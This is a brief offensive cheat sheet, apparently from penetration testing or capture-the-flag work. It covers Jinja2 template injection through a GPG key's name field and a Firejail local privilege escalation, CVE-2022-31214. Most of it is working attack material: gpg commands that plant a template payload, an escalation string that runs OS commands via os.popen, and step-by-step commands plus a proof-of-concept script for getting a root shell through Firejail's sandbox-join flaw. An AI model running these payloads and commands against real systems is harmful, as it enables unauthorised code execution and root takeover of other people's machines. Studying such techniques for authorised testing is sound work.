# GPG Signature Verification SSTI

When an app displays GPG signature verification output (signer name/comment) inside a template engine (Jinja2/Flask), the GPG key name field becomes a SSTI injection point.

## Attack

Generate a GPG key with SSTI payload in the name:
```bash
gpg --batch --gen-key /dev/stdin << GPGEOF
Key-Type: RSA
Key-Length: 2048
Name-Real: {{7*7}}
Name-Email: test@test.com
Expire-Date: 0
%no-passphrase
GPGEOF
```

Sign a message with it:
```bash
echo "test" | gpg --clearsign --default-key test@test.com
```

Submit signed message to the app's verification endpoint. If name renders as `49` → Jinja2 SSTI. Escalate:
```
Name-Real: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## Firejail Privesc (CVE-2022-31214)

Firejail < 0.9.68 SUID root binary: unprivileged join of another sandbox → local root.

```bash
firejail --version
ls -la /usr/bin/firejail  # confirm SUID

# Start a sandbox as current user
firejail --private sleep 1000 &
pid=$(pgrep -n firejail)

# Join sandbox - this triggers the privesc
firejail --join=$pid bash
# Inside: run the PoC to get root shell

# Automated PoC:
# https://github.com/sycurion/CVE-2022-31214
python3 firejail_privesc.py
```
